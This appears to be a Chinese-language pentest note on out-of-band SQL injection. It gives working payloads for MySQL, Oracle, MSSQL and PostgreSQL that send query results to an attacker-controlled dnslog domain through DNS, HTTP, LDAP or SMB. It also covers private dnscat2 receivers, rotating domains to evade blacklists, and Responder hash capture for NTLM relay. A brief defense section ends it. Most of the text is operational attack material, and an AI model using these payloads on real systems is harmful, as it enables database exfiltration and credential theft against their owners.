# SQL 注入信息外带（OOB）

## 一句话理解
OOB（Out-of-Band）SQL 注入，是指在页面没有直接回显、报错和时间差都不稳定时，借助数据库自身的网络能力，把查询结果通过 DNS、HTTP、SMB 等带外通道送到攻击者可观察的位置。

## 适用场景
适合以下情况：
- 页面无直接回显
- 报错信息被抑制
- 时间盲注成本过高
- 目标数据库允许出网或能访问内网 DNS / HTTP / SMB 资源

## 核心思路
把查询结果拼进一个可控域名或 URL 中，诱导数据库发起：
- DNS 查询
- HTTP 请求
- SMB / UNC 路径访问

攻击者再在 DNSLog、HTTPLog 或自建服务端接收这些请求，从而间接拿到数据。

## 前期准备
需要一个你可控的带外接收点，例如：
1. DNSLog 平台：[dnslog.cn](http://www.dnslog.cn/)
2. 自建 DNS 服务器和域名

示例中 `re111.dnslog.cn` 为攻击者可控的三级域名。

## 常见前提
- 数据库具备相关网络函数或文件访问能力
- 注入点至少支持一定程度的表达式执行
- 目标环境允许目标协议出站
- 需要时具备联合注入、堆叠注入或高权限函数调用条件

## 四数据库 OOB 能力对比
先总览四种数据库的通道与门槛，再按数据库看具体 payload：

| 数据库 | 常用 OOB 通道 | 权限要求 | 是否需要 DBA / 高权限 | 平台与协议限制 | 常见注入形态 |
| --- | --- | --- | --- | --- | --- |
| MySQL | `load_file()` + UNC 路径 | 需 `FILE` 权限，且 `secure_file_priv` 为空或允许 | 不需要 DBA，普通账户授予 `FILE` 即可 | 仅 Windows 有效（UNC 依赖 SMB 名称解析）；Linux 无此行为 | 联合注入 / 堆叠注入 |
| Oracle | `UTL_HTTP.REQUEST()`、`UTL_INADDR.GET_HOST_ADDRESS()`、`HTTPURITYPE()`、`DBMS_LDAP.INIT()` | 当前用户需对相应包有 `EXECUTE` 权限 | 不强制 DBA，但相关包权限一般由 DBA 授予 | 跨平台；依赖数据库主机可出网（HTTP / DNS / LDAP） | 联合注入 / 堆叠注入 |
| MSSQL | `xp_dirtree`、`xp_fileexist`、`xp_subdirs` | 需 `sysadmin` 或对系统扩展过程有 `EXECUTE` | 通常需要 sysadmin 级高权限 | Windows 上效果最好（UNC 触发 DNS / SMB）；Linux 版 MSSQL 无这些 xp 过程 | 堆叠注入为主 |
| PostgreSQL | `dblink` 扩展、`COPY ... FROM '\\server\share'` | `dblink` 需 superuser 安装扩展；`COPY` 网络路径需 superuser | 基本需要 superuser（若 dblink 已预装，普通用户可调用） | 跨平台；`COPY` 的 UNC 在 Linux 上依赖 SMB 客户端；`dblink` 走 PG 协议出网 | 堆叠注入 |

选型速记：
- 目标是 Windows：优先试 MySQL `load_file` UNC、MSSQL `xp_dirtree`
- 目标是 Linux：优先试 Oracle 四函数、PostgreSQL `dblink`
- 权限不明：先试门槛低的（MySQL 仅需 `FILE` 权限，低于 MSSQL 的 sysadmin 要求）

## 各数据库利用思路
### 1. MySQL
#### 条件
- 常见于 Windows 环境
- `secure_file_priv` 不能卡死相关利用路径
- 通常适用于联合注入或堆叠注入

#### 思路
利用 `load_file()` 结合 Windows UNC 路径，让目标去解析攻击者域名：

```sql
select load_file(concat("\\\\",version(),".re111.dnslog.cn//1ndex.txt"));
```

实战要点：
- 依赖 Windows UNC 路径行为
- 依赖目标主机能发起相应名称解析或 SMB 访问

### 2. Oracle
#### 条件
- 常见于联合注入或堆叠注入
- 对相关网络包和函数的执行权限要求较高

#### 常见函数
`UTL_HTTP.REQUEST()`：

```sql
SELECT UTL_HTTP.REQUEST((SELECT * from v$version)||'.re111.dnslog.cn') FROM sys.DUAL;
```

`DBMS_LDAP.INIT()`：

```sql
SELECT DBMS_LDAP.INIT((SELECT * from v$version)||'.re111.dnslog.cn',80) FROM sys.DUAL;
```

`HTTPURITYPE()`：

```sql
SELECT HTTPURITYPE((SELECT * from v$version)||'.re111.dnslog.cn').GETCLOB() FROM sys.DUAL;
```

`UTL_INADDR.GET_HOST_ADDRESS()`：

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT * from v$version)||'.re111.dnslog.cn') FROM sys.DUAL;
```

> 原文这里 `UTL_INADDR.GET_HOST_ADDRESS()` 的示例与 `HTTPURITYPE()` 重复，我已按函数名补成更一致的形式。

### 3. MSSQL
#### 条件
- 常见于 Windows 环境
- 适用于联合注入或堆叠注入

#### 思路
原理与 MySQL 利用 UNC 路径较接近，借助系统过程访问远程共享路径，带出 DNS 请求：

`xp_dirtree`：

```sql
d=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))+'.re111.dnslog.cn'; EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');
```

`xp_fileexist`：

```sql
id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))+'.re111.dnslog.cn'; EXEC('master..xp_fileexist "\\'+@host+'\foobar$"');
```

`xp_subdirs`：

```sql
id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))+'.re111.dnslog.cn'; EXEC('master..xp_subdirs "\\'+@host+'\foobar$"');
```

### 4. PostgreSQL
#### 条件
- 常见于 Windows 环境
- 通常需要堆叠注入

#### 思路 1：利用 `COPY`

```sql
id=1;DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT; DECLARE query_result TEXT; BEGIN SELECT INTO query_result (select version()); exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.re111.dnslog.cn\\\\aaa.txt\''; EXECUTE exec_cmd; END; $$ LANGUAGE plpgSQL SECURITY DEFINER; SELECT temp_function();
```

#### 思路 2：开启 `dblink`

```sql
-- 先安装 dblink 扩展（需 superuser），再发起带外连接
-- 基础可用形式：先验证通道是否连通（xxx.dnslog.cn 收到查询即通）
SELECT * FROM dblink('host=xxx.dnslog.cn user=x dbname=x', 'SELECT 1') AS (t text);

-- 拼接注入数据的完整形式
id=1;CREATE EXTENSION dblink;SELECT * FROM dblink('host='||(SELECT version())||'.re111.dnslog.cn user=1ndex password=1ndex dbname=1ndex','SELECT 1') AS (result TEXT);
```

修正说明（原语句存在格式问题）：
- `RETURNS (result TEXT)` 改为 `AS (result TEXT)`：表函数的列定义语法是 `AS (...)`，`RETURNS` 只用于 `CREATE FUNCTION`
- 连接串键名改用 `user`/`password`/`dbname`：这些才是 libpq 的合法参数名，原来的 `username` 不是有效键
- 子查询语句改为 `'SELECT 1'`：原来的 `'SELECT 1ndex'` 是非法标识符，会直接报列不存在
- `version()` 输出含空格和括号，直接拼进 `host=` 会破坏连接串解析；实战建议先清洗特殊字符，例如 `(SELECT replace(version(),' ',''))`，或改外带较短的无空格数据

## 实战注意点
### 1. OOB 不等于稳定回显
它更像一种“带外确认”和“低频数据外带”方式，不适合高吞吐盲注枚举所有内容。

### 2. DNS 标签长度有限
把数据拼进子域名时，需要考虑：
- 单段长度限制
- 特殊字符编码
- 结果裁剪

### 3. 权限与网络环境决定成败
不是数据库支持某函数就一定能打通，还要看：
- 是否有执行权限
- 是否允许出网
- 是否被防火墙、DNS 策略或代理拦截

## 自建 DNS 接收方案
### 1. 公共 DNSLog 平台的局限
dnslog.cn、ceye.io、requestrepo.com 这类公共平台上手快，但有明显局限：
- 记录公开可查：拿到或猜到子域名的任何人都能查看你的外带数据，等于把目标数据交给第三方
- 稳定性差：公共平台经常被墙、限流或关停，长周期项目不可控
- 域名信誉差：大量红队共用，企业安全设备可能已把这些域名加黑名单
- 子域冲突：多任务共用平台时容易与他人撞名，记录混在一起
- 记录保留时间短、缺少留存 API，不利于复盘取证

### 2. 自建接收点
方案一：自建权威 DNS / dnscat2

```bash
# 前提：拥有一个域名，在其 DNS 服务商处把 NS 记录指向自己的 VPS
# NS 生效后，所有 *.yourdomain.com 的递归查询最终都会落到 VPS
ruby dnscat2.rb yourdomain.com --dns port=53,domain=yourdomain.com
```

- 数据完全私有、域名可随时更换以规避黑名单、记录可长期留存

方案二：Burp Collaborator
- Burp Pro 自带 Collaborator，可临时替代 DNSLog 观察带外请求
- 配合 Burp Collaborator Everywhere 插件，可对页面参数自动注入 Collaborator payload，批量发现 OOB 出网点
- 对保密要求高的项目，Burp 支持自建 Collaborator Server（自有域名 + VPS）

### 3. 内网 DNS 转发判断
目标环境通常使用内部 DNS 服务器，外带是否可达要单独判断：
- 原理：目标主机把 `xxx.yourdomain.com` 交给内网 DNS 递归解析，只要内网 DNS 允许转发外部域名，最终仍会查询到你的权威 NS
- 验证：先从注入点触发固定子域名（如 `probe1.yourdomain.com`），看自建服务端是否收到
- 收不到的常见原因：内网 DNS 配置了域名白名单或只解析内网域、DNS 出口被防火墙拦截、出站 DNS 被强制走指定转发器
- 内网 DNS 不转发外域时 DNS 通道基本失效，可改试 HTTP / SMB 类 OOB（前提是相应协议可出网）

## SMB Relay 联动
UNC 路径类 OOB（MySQL `load_file`、MSSQL `xp_dirtree` 等）在触发目标发起 SMB 认证的同时，可在同网段配合 Responder 伪造 SMB 服务端捕获 Net-NTLM Hash，用于后续中继或离线爆破，思路见 [哈希获取笔记](../penetration/PEN-GetHash.md)。

## 防御要点
### 1. 根本防御仍是参数化查询
OOB 只是 SQL 注入的一种利用方式，不是单独漏洞。

### 2. 限制数据库外连能力
从网络层限制数据库主机：
- DNS 出站
- HTTP 出站
- SMB / UNC 访问

### 3. 关闭高危网络函数和扩展
尤其是 Oracle、MSSQL、PostgreSQL 中与网络、文件系统、外部连接相关的功能。

### 4. 最小权限
应用数据库账户不应拥有调用高危包、扩展或系统过程的能力。

## 速查清单
- 无回显时优先考虑 OOB 是否可行
- 先判断数据库类型，再选对应的网络函数或 UNC 路径利用
- 先验证 DNSLog / HTTPLog 是否能收到请求
- 评估权限、出网和协议支持，不盲目套 payload
- OOB 更适合确认利用和外带关键数据，不适合大规模慢速枚举

## Reference
- https://www.cnblogs.com/wjrblogs/p/14367387.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection（PayloadsAllTheThings SQL 注入 OOB 章节）
